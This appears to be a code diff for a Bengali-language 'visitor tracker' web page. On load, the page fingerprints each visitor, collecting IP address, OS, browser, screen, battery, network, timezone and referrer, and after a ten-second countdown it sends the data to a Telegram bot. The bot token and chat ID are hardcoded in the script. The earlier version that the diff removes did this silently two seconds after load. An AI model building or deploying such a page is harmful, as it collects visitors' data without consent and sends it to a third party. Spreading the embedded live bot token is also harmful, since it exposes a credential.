@@ -1,13 +1,177 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>ভিজিটর ট্র্যাকার - ১০ সেকেন্ড কাউন্টডাউন</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none; /* just for cleaner look */
+        }
+        body {
+            background: linear-gradient(145deg, #0a2f3f 0%, #05161f 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Roboto', sans-serif;
+            padding: 1rem;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+            border-radius: 3rem;
+            padding: 2rem 2rem 2.5rem;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            width: 100%;
+            max-width: 550px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        h1 {
+            font-size: 2rem;
+            font-weight: 600;
+            color: #ffffff;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            letter-spacing: -0.3px;
+            margin-bottom: 0.5rem;
+        }
+        .sub {
+            color: #b0e0ff;
+            margin-bottom: 2rem;
+            font-size: 0.95rem;
+            border-bottom: 1px dashed rgba(255,255,255,0.3);
+            display: inline-block;
+            padding-bottom: 0.3rem;
+        }
+        .timer-box {
+            background: #00000055;
+            border-radius: 4rem;
+            padding: 1.2rem;
+            margin: 1.5rem 0;
+            border: 1px solid #ffffff44;
+        }
+        .countdown {
+            font-size: 5.5rem;
+            font-weight: 800;
+            font-family: monospace;
+            background: linear-gradient(135deg, #FFE6B0, #FFB347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 15px #ffb34780;
+            letter-spacing: 5px;
+        }
+        .status {
+            font-size: 1.2rem;
+            margin-top: 0.8rem;
+            color: #c9f0ff;
+            font-weight: 500;
+        }
+        .info-preview {
+            background: #0a1a1fcc;
+            border-radius: 1.8rem;
+            padding: 1rem;
+            margin-top: 1.8rem;
+            font-size: 0.8rem;
+            text-align: left;
+            font-family: monospace;
+            color: #bcdfe6;
+            border: 1px solid #2c6e7e;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .info-preview h4 {
+            color: #ffcf8a;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffffff80;
+            border-radius: 50%;
+            border-top-color: #ffb347;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .final-msg {
+            margin-top: 20px;
+            background: #1e4a2eaa;
+            padding: 10px;
+            border-radius: 40px;
+            color: #d4ffc6;
+            font-weight: bold;
+        }
+        footer {
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #6c8d96;
+        }
+        button {
+            background: #ffb347;
+            border: none;
+            margin-top: 15px;
+            padding: 8px 20px;
+            border-radius: 60px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #ff9f1a;
+            transform: scale(0.97);
+        }
+    </style>
+</head>
+<body>
+<div class="card" id="app">
+    <h1>📡 ভিজিটর তথ্য সংগ্রহ</h1>
+    <div class="sub">আপনার তথ্য নিরাপদে প্রেরিত হবে</div>
+
+    <div class="timer-box">
+        <div class="countdown" id="countdownNumber">10</div>
+        <div class="status" id="statusText">⏳ কাউন্টডাউন চলছে...</div>
+    </div>
+
+    <div class="info-preview" id="previewArea">
+        <h4>🔍 সংগৃহীত তথ্যের প্রাকদর্শন</h4>
+        <div id="previewContent">লোড হচ্ছে...</div>
+    </div>
+
+    <div id="resultMsg"></div>
+    <footer>🔒 শুধুমাত্র পরিসংখ্যানের উদ্দেশ্যে | ১০ সেকেন্ড পর তথ্য পাঠানো হবে</footer>
+</div>
+
 <script>
 (function() {
-    // ============================================
-    // বিস্তারিত ভিজিটর ট্র্যাকিং (CORS error থাকবে না)
-    // ============================================
-
+    // --------------------------------------------
+    // কনফিগারেশন (আপনার টেলিগ্রাম বট তথ্য)
+    // --------------------------------------------
     const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
     const DEFAULT_CHAT_ID = "7709670231";
 
-    // ✅ IP ঠিকানা (CORS-মুক্ত ipify.org)
+    // DOM এলিমেন্টস
+    const countdownEl = document.getElementById('countdownNumber');
+    const statusEl = document.getElementById('statusText');
+    const previewContent = document.getElementById('previewContent');
+    const resultMsgDiv = document.getElementById('resultMsg');
+
+    let countdown = 10;
+    let timerInterval = null;
+    let collectedData = null;   // সব ডাটা সংরক্ষণ
+
+    // ---------------------- তথ্য সংগ্রহের ফাংশন -------------------------
     async function getIPAddress() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -19,7 +183,6 @@
         return "আইপি পাওয়া যায়নি";
     }
 
-    // ডিভাইস ও ব্রাউজারের তথ্য
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let platform = "অজানা";
@@ -35,11 +198,9 @@
         else if (/Firefox/i.test(ua)) browser = "Firefox";
         else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
         else if (/Edg/i.test(ua)) browser = "Edge";
-
         return { platform, browser };
     }
 
-    // ব্যাটারি তথ্য (যদি সমর্থিত হয়)
     async function getBatteryInfo() {
         if (!navigator.getBattery) return "সমর্থিত নয়";
         try {
@@ -52,14 +213,12 @@
         }
     }
 
-    // নেটওয়ার্ক তথ্য (connection API)
     function getNetworkInfo() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (!conn) return { type: "নেই", rtt: "নেই", speed: "নেই" };
-        const effectiveType = conn.effectiveType || "অজানা"; // '4g', '3g', etc.
+        const effectiveType = conn.effectiveType || "অজানা";
         const rtt = conn.rtt ? `${conn.rtt}ms` : "নেই";
         const downlink = conn.downlink ? `${conn.downlink}Mbps` : "নেই";
-        // মানবপাঠ্য নেটওয়ার্ক টাইপ
         let type = effectiveType.toUpperCase();
         if (type === '4G') type = '4G';
         else if (type === '3G') type = '3G';
@@ -68,7 +227,6 @@
         return { type, rtt, speed: downlink };
     }
 
-    // অন্যান্য তথ্য
     function getExtraInfo() {
         const colorDepth = `${screen.colorDepth}-bit`;
         const language = navigator.language || navigator.userLanguage || "অজানা";
@@ -79,22 +237,9 @@
         return { colorDepth, language, timezone, localTime, cookies, referrer };
     }
 
-    async function trackVisitor() {
-        // বট টোকেন যাচাই
-        try {
-            const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-            const checkResult = await check.json();
-            if (!checkResult.ok) {
-                console.warn("বট টোকেন ভুল! @BotFather থেকে নতুন টোকেন নিন");
-                return;
-            }
-            console.log("বট সক্রিয়:", checkResult.result.username);
-        } catch(e) {
-            console.warn("বট চেক করা যায়নি");
-            return;
-        }
-
-        // সব তথ্য সমান্তরালে সংগ্রহ
+    // সব তথ্য একত্রে সংগ্রহ করবে (প্রিভিউ আপডেট সহ)
+    async function collectAllData() {
+        statusEl.innerHTML = "📡 তথ্য সংগ্রহ করা হচ্ছে...";
         const [ip, battery, device, network, extra] = await Promise.all([
             getIPAddress(),
             getBatteryInfo(),
@@ -104,11 +249,31 @@
         ]);
 
         const now = new Date();
+        const fullData = {
+            ip, battery, device, network, extra,
+            screen: `${screen.width}x${screen.height}`,
+            timestamp: now.toLocaleString('bn-BD')
+        };
+        
+        // প্রিভিউ আপডেট (user যাতে দেখতে পারে কি তথ্য যাচ্ছে)
+        const previewHtml = `
+            <strong>🖥️ আইপি:</strong> ${ip}<br>
+            <strong>📱 ওএস:</strong> ${device.platform} &nbsp;| <strong>🌐 ব্রাউজার:</strong> ${device.browser}<br>
+            <strong>📐 স্ক্রিন:</strong> ${fullData.screen} &nbsp;| <strong>🎨 কালার ডেপথ:</strong> ${extra.colorDepth}<br>
+            <strong>🔋 ব্যাটারি:</strong> ${battery}<br>
+            <strong>📶 নেটওয়ার্ক:</strong> ${network.type} &nbsp;| <strong>⏱️ RTT:</strong> ${network.rtt} &nbsp;| <strong>⚡ স্পিড:</strong> ${network.speed}<br>
+            <strong>🌍 ভাষা:</strong> ${extra.language} &nbsp;| <strong>🕒 টাইমজোন:</strong> ${extra.timezone}<br>
+            <strong>📅 স্থানীয় সময়:</strong> ${extra.localTime}<br>
+            <strong>🍪 কুকি:</strong> ${extra.cookies} &nbsp;| <strong>🔗 রেফারার:</strong> ${extra.referrer}
+        `;
+        previewContent.innerHTML = previewHtml;
+        
+        // টেলিগ্রামের জন্য মেসেজ বানানো
         const message = `📢 নিউ ভিজিট (ক্লিক করা হয়েছে)
 আইপি: ${ip}
 ওএস: ${device.platform}
 ব্রাউজার: ${device.browser}
-স্ক্রিন: ${screen.width}x${screen.height}
+স্ক্রিন: ${fullData.screen}
 কালার ডেপথ: ${extra.colorDepth}
 ব্যাটারি: ${battery}
 নেটওয়ার্ক: ${network.type}
@@ -119,32 +284,90 @@ RTT: ${network.rtt}
 স্থানীয় সময়: ${extra.localTime}
 কুকি: ${extra.cookies}
 রেফারার: ${extra.referrer}`;
+        
+        return { message, previewHtml };
+    }
 
+    // টেলিগ্রামে পাঠানোর ফাংশন
+    async function sendToTelegram(messageText) {
         try {
             const params = new URLSearchParams();
             params.append('chat_id', DEFAULT_CHAT_ID);
-            params.append('text', message);
-
+            params.append('text', messageText);
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: params
             });
-
             const result = await res.json();
             if (result.ok) {
-                console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
+                resultMsgDiv.innerHTML = '<div class="final-msg">✅ সফলভাবে টেলিগ্রামে তথ্য পাঠানো হয়েছে!</div>';
+                statusEl.innerHTML = "✅ সম্পন্ন! ধন্যবাদ।";
             } else {
-                console.error("❌ Telegram error:", result.description);
+                resultMsgDiv.innerHTML = `<div class="final-msg" style="background:#8b3c2eaa;">❌ পাঠানো ব্যর্থ: ${result.description || "অজানা ত্রুটি"}</div>`;
+                statusEl.innerHTML = "⚠️ টেলিগ্রাম পাঠাতে সমস্যা";
             }
         } catch(e) {
-            console.warn("নেটওয়ার্ক এরর:", e);
+            console.warn(e);
+            resultMsgDiv.innerHTML = '<div class="final-msg" style="background:#8b3c2eaa;">❌ নেটওয়ার্ক ত্রুটি, পরে চেষ্টা করুন</div>';
+            statusEl.innerHTML = "⚠️ সংযোগ সমস্যা";
         }
     }
 
-    // পেজ লোডের ২ সেকেন্ড পরে ট্র্যাকিং শুরু
-    setTimeout(() => {
-        trackVisitor();
-    }, 2000);
+    // কাউন্টডাউন শুরু করার আগে তথ্য সংগ্রহ করব
+    async function initTrackingWithCountdown() {
+        // প্রথমে ডাটা কালেক্ট করি (প্রিভিউ দেখানোর জন্য)
+        statusEl.innerHTML = "📊 তথ্য সংগ্রহ শুরু...";
+        const { message } = await collectAllData();
+        collectedData = message;  // সংরক্ষণ
+        
+        // এখন কাউন্টডাউন শুরু
+        statusEl.innerHTML = `⏳ ${countdown} সেকেন্ড বাকি...`;
+        timerInterval = setInterval(async () => {
+            countdown--;
+            if (countdownEl) countdownEl.innerText = countdown;
+            statusEl.innerHTML = `⏳ ${countdown} সেকেন্ড বাকি ...`;
+            
+            if (countdown <= 0) {
+                clearInterval(timerInterval);
+                statusEl.innerHTML = "📤 টেলিগ্রামে পাঠানো হচ্ছে...";
+                countdownEl.innerText = "🚀";
+                // পাঠিয়ে দেই
+                await sendToTelegram(collectedData);
+                // কাউন্টডাউন শেষ — বাটন বা রিফ্রেশের দরকার নেই, তবে রি-ট্রিগার এড়াতে
+                // ইউজার নিজে রিলোড করতে পারে
+                statusEl.innerHTML = "✅ সম্পন্ন। পেজ রিফ্রেশ করলে আবার ট্রিগার হবে।";
+            }
+        }, 1000);
+    }
+
+    // বট টোকেন ভ্যালিডিটি চেক (নিরাপত্তার জন্য অপশনাল)
+    async function validateBot() {
+        try {
+            const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+            const checkResult = await check.json();
+            if (!checkResult.ok) {
+                statusEl.innerHTML = "⚠️ বট টোকেন ভুল! @BotFather দিয়ে ঠিক করুন।";
+                countdownEl.innerText = "❗";
+                return false;
+            }
+            return true;
+        } catch(e) {
+            statusEl.innerHTML = "⚠️ বট যাচাই করা যায়নি, তবু চালু থাকবে";
+            return true; // তাও এগিয়ে যাই
+        }
+    }
+
+    // সব কিছু শুরু
+    (async function start() {
+        const isBotOk = await validateBot();
+        if (!isBotOk) return;
+        // প্রাথমিক প্রিভিউ দেখানোর জন্য দ্রুত কিছু
+        previewContent.innerHTML = "তথ্য সংগ্রহ করা হচ্ছে, দয়া করে অপেক্ষা করুন...";
+        await initTrackingWithCountdown();
+    })();
+
 })();
 </script>
+</body>
+</html>
